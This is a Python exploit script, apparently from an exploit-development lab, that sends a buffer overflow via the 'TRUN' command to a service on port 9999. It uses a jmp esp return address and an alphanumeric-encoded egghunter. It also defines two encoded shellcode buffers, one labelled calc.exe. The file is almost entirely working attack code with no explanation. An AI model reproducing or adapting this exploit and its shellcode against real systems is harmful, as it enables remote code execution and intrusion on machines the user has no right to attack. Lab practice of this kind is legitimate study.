#!/usr/bin/python

import socket
import os
import sys
from pwn import *
host = "192.168.1.108"
port = 9999

buf =  ""
buf += "\xda\xc9\xbd\xf1\xa4\x0d\xca\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x13\x03\x9b\xb7\xef"
buf += "\x3f\xa7\x50\x6d\xbf\x57\xa1\x12\x49\xb2\x90\x12\x2d"
buf += "\xb7\x83\xa2\x25\x95\x2f\x48\x6b\x0d\xbb\x3c\xa4\x22"
buf += "\x0c\x8a\x92\x0d\x8d\xa7\xe7\x0c\x0d\xba\x3b\xee\x2c"
buf += "\x75\x4e\xef\x69\x68\xa3\xbd\x22\xe6\x16\x51\x46\xb2"
buf += "\xaa\xda\x14\x52\xab\x3f\xec\x55\x9a\xee\x66\x0c\x3c"
buf += "\x11\xaa\x24\x75\x09\xaf\x01\xcf\xa2\x1b\xfd\xce\x62"
buf += "\x52\xfe\x7d\x4b\x5a\x0d\x7f\x8c\x5d\xee\x0a\xe4\x9d"
buf += "\x93\x0c\x33\xdf\x4f\x98\xa7\x47\x1b\x3a\x03\x79\xc8"
buf += "\xdd\xc0\x75\xa5\xaa\x8e\x99\x38\x7e\xa5\xa6\xb1\x81"
buf += "\x69\x2f\x81\xa5\xad\x6b\x51\xc7\xf4\xd1\x34\xf8\xe6"
buf += "\xb9\xe9\x5c\x6d\x57\xfd\xec\x2c\x30\x32\xdd\xce\xc0"
buf += "\x5c\x56\xbd\xf2\xc3\xcc\x29\xbf\x8c\xca\xae\xc0\xa6"
buf += "\xab\x20\x3f\x49\xcc\x69\x84\x1d\x9c\x01\x2d\x1e\x77"
buf += "\xd1\xd2\xcb\xd8\x81\x7c\xa4\x98\x71\x3d\x14\x71\x9b"
buf += "\xb2\x4b\x61\xa4\x18\xe4\x08\x5f\xcb\xcb\x65\x5e\x03"
buf += "\xa4\x77\x60\x17\xe6\xf1\x86\x7d\x16\x54\x11\xea\x8f"
buf += "\xfd\xe9\x8b\x50\x28\x94\x8c\xdb\xdf\x69\x42\x2c\x95"
buf += "\x79\x33\xdc\xe0\x23\x92\xe3\xde\x4b\x78\x71\x85\x8b"
buf += "\xf7\x6a\x12\xdc\x50\x5c\x6b\x88\x4c\xc7\xc5\xae\x8c"
buf += "\x91\x2e\x6a\x4b\x62\xb0\x73\x1e\xde\x96\x63\xe6\xdf"
buf += "\x92\xd7\xb6\x89\x4c\x81\x70\x60\x3f\x7b\x2b\xdf\xe9"
buf += "\xeb\xaa\x13\x2a\x6d\xb3\x79\xdc\x91\x02\xd4\x99\xae"
buf += "\xab\xb0\x2d\xd7\xd1\x20\xd1\x02\x52\x50\x98\x0e\xf3"
buf += "\xf9\x45\xdb\x41\x64\x76\x36\x85\x91\xf5\xb2\x76\x66"
buf += "\xe5\xb7\x73\x22\xa1\x24\x0e\x3b\x44\x4a\xbd\x3c\x4d"


# calc.exe
calcShellCode =  ""
calcShellCode += "\xd9\xc4\xb8\xed\x0d\x0c\xb4\xd9\x74\x24\xf4"
calcShellCode += "\x5d\x29\xc9\xb1\x31\x31\x45\x18\x03\x45\x18"
calcShellCode += "\x83\xed\x11\xef\xf9\x48\x01\x72\x01\xb1\xd1"
calcShellCode += "\x13\x8b\x54\xe0\x13\xef\x1d\x52\xa4\x7b\x73"
calcShellCode += "\x5e\x4f\x29\x60\xd5\x3d\xe6\x87\x5e\x8b\xd0"
calcShellCode += "\xa6\x5f\xa0\x21\xa8\xe3\xbb\x75\x0a\xda\x73"
calcShellCode += "\x88\x4b\x1b\x69\x61\x19\xf4\xe5\xd4\x8e\x71"
calcShellCode += "\xb3\xe4\x25\xc9\x55\x6d\xd9\x99\x54\x5c\x4c"
calcShellCode += "\x92\x0e\x7e\x6e\x77\x3b\x37\x68\x94\x06\x81"
calcShellCode += "\x03\x6e\xfc\x10\xc2\xbf\xfd\xbf\x2b\x70\x0c"
calcShellCode += "\xc1\x6c\xb6\xef\xb4\x84\xc5\x92\xce\x52\xb4"
calcShellCode += "\x48\x5a\x41\x1e\x1a\xfc\xad\x9f\xcf\x9b\x26"
calcShellCode += "\x93\xa4\xe8\x61\xb7\x3b\x3c\x1a\xc3\xb0\xc3"
calcShellCode += "\xcd\x42\x82\xe7\xc9\x0f\x50\x89\x48\xf5\x37"
calcShellCode += "\xb6\x8b\x56\xe7\x12\xc7\x7a\xfc\x2e\x8a\x10"
calcShellCode += "\x03\xbc\xb0\x56\x03\xbe\xba\xc6\x6c\x8f\x31"
calcShellCode += "\x89\xeb\x10\x90\xee\x04\x5b\xb9\x46\x8d\x02"
calcShellCode += "\x2b\xdb\xd0\xb4\x81\x1f\xed\x36\x20\xdf\x0a"
calcShellCode += "\x26\x41\xda\x57\xe0\xb9\x96\xc8\x85\xbd\x05"
calcShellCode += "\xe8\x8f\xdd\xc8\x7a\x53\x0c\x6f\xfb\xf6\x50"

egghunter  = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x62\x11\x31\x36" ## add  eax, 0x36311162
egghunter += "\x05\x51\x12\x31\x35" ## add  eax, 0x35311251
egghunter += "\x05\x32\x11\x21\x24" ## add  eax, 0x24211132
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x32\x34\x33\x03" ## add  eax, 0x03333432
egghunter += "\x05\x22\x24\x33\x02" ## add  eax, 0x02332422
egghunter += "\x50"                 ## push eax

egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x43\x64\x77\x64" ## add  eax, 0x64776443
egghunter += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
egghunter += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x57\x43\x65\x57" ## add  eax, 0x57654357
egghunter += "\x05\x46\x33\x54\x46" ## add  eax, 0x46543346
egghunter += "\x05\x45\x32\x64\x45" ## add  eax, 0x45643245
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x21\x43\x46\x75" ## add  eax, 0x75464321
egghunter += "\x05\x21\x32\x45\x64" ## add  eax, 0x64453221
egghunter += "\x05\x21\x32\x33\x54" ## add  eax, 0x54333221
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x67\x64\x44\x21" ## add  eax, 0x21446467
egghunter += "\x05\x56\x54\x33\x21" ## add  eax, 0x21335456
egghunter += "\x05\x65\x33\x33\x21" ## add  eax, 0x21333365
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x26\x03\x35\x32" ## add  eax, 0x32350326
egghunter += "\x05\x16\x02\x25\x42" ## add  eax, 0x42250216
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x01\x34\x67\x17" ## add  eax, 0x17673401
egghunter += "\x05\x01\x24\x66\x17" ## add  eax, 0x17662401
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x17\x32\x32\x35" ## add  eax, 0x35323217
egghunter += "\x05\x16\x21\x31\x34" ## add  eax, 0x34312116
egghunter += "\x05\x15\x22\x22\x34" ## add  eax, 0x34222215
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x33\x41\x65\x77" ## add  eax, 0x77654133
egghunter += "\x05\x33\x42\x54\x66" ## add  eax, 0x66544233
egghunter += "\x05\x33\x31\x44\x55" ## add  eax, 0x55443133
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax






'''
esp = 00B8FA0C
goaddress = 00B8FBBE

1B2

'''


buffer = "A"*2002
buffer += p32(0x625011AF) # jmp esp
buffer +="\x90"*2
buffer += egghunter
buffer +="C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
